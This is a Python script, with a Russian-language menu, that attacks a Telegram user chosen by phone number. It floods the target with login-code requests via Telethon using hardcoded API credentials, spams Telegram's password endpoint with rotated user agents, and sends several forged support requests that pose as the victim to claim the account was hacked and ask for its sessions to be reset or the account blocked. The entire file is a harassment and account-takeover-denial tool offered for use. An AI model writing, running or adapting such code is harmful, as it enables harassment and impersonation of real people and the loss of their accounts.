


import time
import random
import string
import requests
from telethon.sync import TelegramClient

user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        'Mozilla/5.0 (Mobile; rv:32.0) Gecko/32.0 Firefox/32.0',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Zune 4.7; Tablet PC 2.0)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36'
    ]

api_id = 18377495
api_hash = 'a0c785ad0fd3e92e7c131f0a70987987'

def auth_spam(phone):
    print("Authcode SPAM\n")
    try:
        random_text1 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        client1 = TelegramClient(random_text1, api_id, api_hash)
        client1.connect() 
        client1.send_code_request(phone)
        client1.disconnect()
        print("Код 1 отправлен")
        random_text2 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        client2 = TelegramClient(random_text2, api_id, api_hash)
        client2.connect()  
        client2.send_code_request(phone)
        client2.disconnect()
        print("Код 2 отправлен")
        random_text3 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        client3 = TelegramClient(random_text3, api_id, api_hash)
        client3.connect() 
        client3.send_code_request(phone)
        client3.disconnect()
        print("Код 3 отправлен")
        random_text4 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        client4 = TelegramClient(random_text4, api_id, api_hash)
        client4.connect()  
        client4.send_code_request(phone)
        client4.disconnect()
        print("Код 4 отправлен")
        random_text5 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        client5 = TelegramClient(random_text5, api_id, api_hash)
        client5.connect()  
        client5.send_code_request(phone)
        client5.disconnect()
        print("Код 5 отправлен")
        random_text6 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        client6 = TelegramClient(random_text6, api_id, api_hash)
        client6.connect()  
        client6.send_code_request(phone)
        client6.disconnect()
        print("Код 6 отправлен")
        os.system("del *.session")
    except:
        pass

def site_auth_spam(phone):
    print('Delete account && oauth SPAM')
    global user_agent
    data = {'phone': phone}
    urls = [
        'https://my.telegram.org/auth/send_password',
        'https://my.telegram.org/auth/send_password',
        'https://my.telegram.org/auth/send_password',
        'https://my.telegram.org/auth/send_password',
        'https://my.telegram.org/auth/send_password',
        'https://my.telegram.org/auth/send_password'
    ]
    for url in urls:
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}
        r = requests.post(url, data=data, headers=headers)
        print(r.text)

def main():
    print("""
░█████╗░░█████╗░░██████╗███████╗██╗░░░░░
██╔══██╗██╔══██╗██╔════╝██╔════╝██║░░░░░
███████║██║░░╚═╝╚█████╗░█████╗░░██║░░░░░
██╔══██║██║░░██╗░╚═══██╗██╔══╝░░██║░░░░░
██║░░██║╚█████╔╝██████╔╝███████╗███████╗
╚═╝░░╚═╝░╚════╝░╚═════╝░╚══════╝╚══════╝
создатель @YANG_YANG_YANG_YANG




""")

    print ("Выберите:\n1 - Снос сессий через telethon\n2 - Снос сейссий через сайты\n3 - все вместе\n4 - все вместе + автоотправка текста")
    vibor = int(input("Введите число: "))
    if vibor == 1:
        auth_spam(int(input("Write phone >> ")))
    elif vibor == 2:
        site_auth_spam(int(input("Write phone >> ")))
    elif vibor == 3:
        phone = int(input("Write phone >>"))
        auth_spam(phone)
        site_auth_spam(phone)
    elif vibor == 4:
        phone = int(input("Write phone >>"))
        username = input("write username of target >> ")
        user_agent1 = random.choice(user_agents)
        user_agent = {'User-Agent': user_agent1}
        random_text1 = ''.join(random.choice(string.ascii_letters) for _ in range(6))
        text = f"Здравствуйте уважаемая поддержка Telegram, мой аккаунт с юзернеймом {username} взломали, я зашел на какойто сайт и его украли, теперь когда я пытаюсь зайти мне всегда завершают сеанс использования, поэтому я прошу обнулить все сеансы(сессии) либо заблокировать мой аккаунт. Надеюсь на скорое реагирование!"
        auth_spam(phone)
        requests.get(f"https://telegram.org/support?message={text}&email={random_text1}@gmail.com&phone={phone}", headers=user_agent)
        requests.get(f"https://telegram.org/support?message={text}&email={random_text1}@gmail.com&phone={phone}", headers=user_agent)
        site_auth_spam(phone)
        r = requests.get(f"https://telegram.org/support?message={text}&email={random_text1}@gmail.com&phone={phone}", headers=user_agent)
        requests.get(f"https://telegram.org/support?message={text}&email={random_text1}@gmail.com&phone={phone}", headers=user_agent)
        requests.get(f"https://telegram.org/support?message={text}&email={random_text1}@gmail.com&phone={phone}", headers=user_agent)
        requests.get(f"https://telegram.org/support?message={text}&email={random_text1}@gmail.com&phone={phone}", headers=user_agent)
        print(r.text)

main()
